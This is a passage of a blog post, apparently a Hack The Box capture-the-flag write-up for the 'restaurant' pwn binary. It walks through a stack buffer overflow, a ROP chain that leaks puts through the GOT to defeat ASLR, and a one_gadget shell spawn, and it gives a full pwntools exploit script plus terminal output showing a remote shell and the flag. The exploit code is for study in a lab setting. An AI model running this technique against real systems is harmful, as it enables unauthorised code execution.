class="line">    p = remote(<span class="string">&quot;46.101.5.30&quot;</span>, 32022)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># python getshell.py                                                                                                                            </span></span><br><span class="line">[+] Opening connection to 46.101.5.30 on port 32022: Done</span><br><span class="line">puts_g address: 0x7fb82ace4aa0</span><br><span class="line">libc address: 0x7fb82ac64000</span><br><span class="line">oneshot address: 0x7fb82acb3432</span><br><span class="line"></span><br><span class="line">[+] Successfully Got The shell:</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Enjoy your BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Enjoy your CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC24ï¿½*\xb8\x7f$</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">libc.so.6</span><br><span class="line">restaurant</span><br><span class="line">run_challenge.sh</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">HTB&#123;r3turn_2_th3_r3st4ur4nt!&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn.jpg"></li>
</ul>
<h2 id="è¯¦ç»†è¿‡ç¨‹åŠexp-2"><a href="#è¯¦ç»†è¿‡ç¨‹åŠexp-2" class="headerlink" title="è¯¦ç»†è¿‡ç¨‹åŠexp - 2"></a>è¯¦ç»†è¿‡ç¨‹åŠexp - 2</h2><h3 id="1-Basic-checks"><a href="#1-Basic-checks" class="headerlink" title="1. Basic checks:"></a>1. Basic checks:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># file restaurant </span></span><br><span class="line">restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># checksec restaurant</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="2-Run-binary-in-GDB-chose-the-first-option-and-input-44B-of-data"><a href="#2-Run-binary-in-GDB-chose-the-first-option-and-input-44B-of-data" class="headerlink" title="2. Run binary in GDB chose the first option and input 44B of data:"></a>2. Run binary in GDB chose the first option and input 44B of data:</h3><p>One thing to notice, data cannot be bigger than 44B, because it will overwrite the RSP register, thus breaking the stack frame.</p>
<p>Although this gives the ability to take control of only the first 4 bytes of the RIP register, which is not enough to spawn the shell since NX bit is enabled</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn1.jpg"></li>
</ul>
<p>First phase exploit.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./restaurant&quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;</span><span class="string">&#x27;c</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaAAAABBBB&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="3-Control-full-8-Byte-return-address"><a href="#3-Control-full-8-Byte-return-address" class="headerlink" title="3. Control full 8 Byte return address:"></a>3. Control full 8 Byte return address:</h3><p>As being said if data is bigger than 44B it breaks the stack frame by overwriting the RSP register and after the RET instruction, binary crash.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn2.jpg"></li>
</ul>
<p>(1) There are some trash bytes in the RSP register.</p>
<p>In order to get rid of them, use the \x00 (null byte) at the end of the input and (2) RET instruction will follow the instruction from RSP register.</p>
<p>Chose an instruction to follow from the binary f.e. 0x0000000000400f75 which is in fact &lt;+13&gt;: call 0x400dfd <setup> in main()</p>
<p>Set a breakpoint at this address and send the payload</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn3.jpg"></li>
</ul>
<h3 id="4-ASLR-bypass"><a href="#4-ASLR-bypass" class="headerlink" title="4. ASLR bypass:"></a>4. ASLR bypass:</h3><p>ASLR does not affect the base address of the restaurant binary.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn4.jpg"></li>
</ul>
<p>The libc library used on the target machine was made available in the challenge package. To calculate the base libc address, it will be needed to be leaked puts() address from libc during binary execution and its dynamic symbol address from libc before execution.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># objdump -T libc.so.6 | grep puts</span></span><br><span class="line">0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts</span><br><span class="line">0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts</span><br><span class="line">0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent</span><br><span class="line">0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent</span><br><span class="line">000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs</span><br><span class="line">000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs</span><br><span class="line">000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked</span><br></pre></td></tr></table></figure>

<p>There is a possibility to redirect the execution to puts() (which is not affected by ASLR) and leak the puts_got address from libc after randomization, thus bypassing ASLR security.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn5.jpg"></li>
</ul>
<h3 id="5-NX-bit-bypass"><a href="#5-NX-bit-bypass" class="headerlink" title="5. NX bit bypass:"></a>5. NX bit bypass:</h3><p>Since there is NX bit enabled, shellcode on stack wonâ€™t work, but there is libc delivered with the restaurant binary which can be used for the ROP gadget# or one_gadget as described in the <span class="exturl" data-url="aHR0cHM6Ly9rYXJvbC1tYXp1cmVrOTUubWVkaXVtLmNvbS9wd24tZm9ybWF0LWNoYWxsZW5nZS1odGItM2E3ZTYzNTFmZjNh">PWN Format challenge - HTB<i class="fa fa-external-link-alt"></i></span>.</p>
<p>Additionally rsp+0x40 has to be set to \x00</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># objdump -T libc.so.6 | grep puts</span></span><br><span class="line">one_gadget libc.so.6</span><br><span class="line">0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts</span><br><span class="line">0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts</span><br><span class="line">0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent</span><br><span class="line">0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent</span><br><span class="line">000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs</span><br><span class="line">000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs</span><br><span class="line">000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked</span><br><span class="line"></span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<p>Added one-second sleep between sending and receiving data to mitigate connection issues. The script counted addresses faster than obtained data.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn6.jpg"></li>
</ul>
<h3 id="6-Final-exploit"><a href="#6-Final-exploit" class="headerlink" title="6. Final exploit:"></a>6. Final exploit:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./restaurant&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./restaurant&quot;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;) # local exploit</span></span><br><span class="line"><span class="comment">#rop = ROP(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;&#x27;&#x27;b * 0x00000000004010a3</span></span><br><span class="line"><span class="comment">#c&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;188.166.173.208&quot;</span>, <span class="number">31974</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>) <span class="comment"># remote exploit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaking libc base =&gt; puts() + main() + puts@got ---</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--- Leaking puts:&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>] <span class="comment"># got entry for puts()</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] <span class="comment"># puts() from binary</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004010a3</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;puts@got address: 0x%x&quot;</span> %(puts_got))</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1st ROP - [set rdi =&gt; arg1 for puts] [arg1 = puts@got] [call puts] [ret to main]</span></span><br><span class="line">p.sendline(<span class="string">&quot;A&quot;</span>*<span class="number">40</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">leak = p.recv()</span><br><span class="line">l = leak.find(<span class="string">&quot;\xa3\x10\x40&quot;</span>) + <span class="number">3</span> </span><br><span class="line">puts_libc = u64(leak[l:l+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Puts addr from libc: &quot;</span> + <span class="built_in">hex</span>(puts_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n --- Calculating libc base:&quot;</span>)</span><br><span class="line">base_libc = puts_libc - <span class="number">0x0000000000080aa0</span></span><br><span class="line">log.success(<span class="string">&quot;Base libc addr: &quot;</span> + <span class="built_in">hex</span>(base_libc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line"><span class="comment"># Calculating one_gadget and overflowing again to its address ---</span></span><br><span class="line">one_gadget = base_libc + <span class="number">0x4f432</span></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;A&quot;</span>*<span class="number">40</span> + p64(one_gadget) + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># python pwnexp.py </span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to 188.166.173.208 on port 31974: Done</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/pwn_restaurant/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">--- Leaking puts:</span><br><span class="line">[+] puts@got address: 0x601fa8</span><br><span class="line">[+] Puts addr from libc: 0x7fb91db82aa0</span><br><span class="line"></span><br><span class="line"> --- Calculating libc base:</span><br><span class="line">[+] Base libc addr: 0x7fb91db02000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">libc.so.6</span><br><span class="line">restaurant</span><br><span class="line">run_challenge.sh</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">HTB&#123;r3turn_2_th3_r3st4ur4nt!&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn7.jpg"></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/05/08/pwn-restaurant/" title="Hack-The-Box-pwn-challenge[restaurant]">https://fdlucifer.github.io/2021/05/08/pwn-restaurant/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="custom mastodon"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/05/08/proper/" rel="prev" title="Hack-The-Box-walkthrough[proper]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[proper]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/05/15/pivotapi/" rel="next" title="Hack-The-Box-walkthrough[pivotapi]">
                  Hack-The-Box-walkthrough[pivotapi] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 â€“ 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  



  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
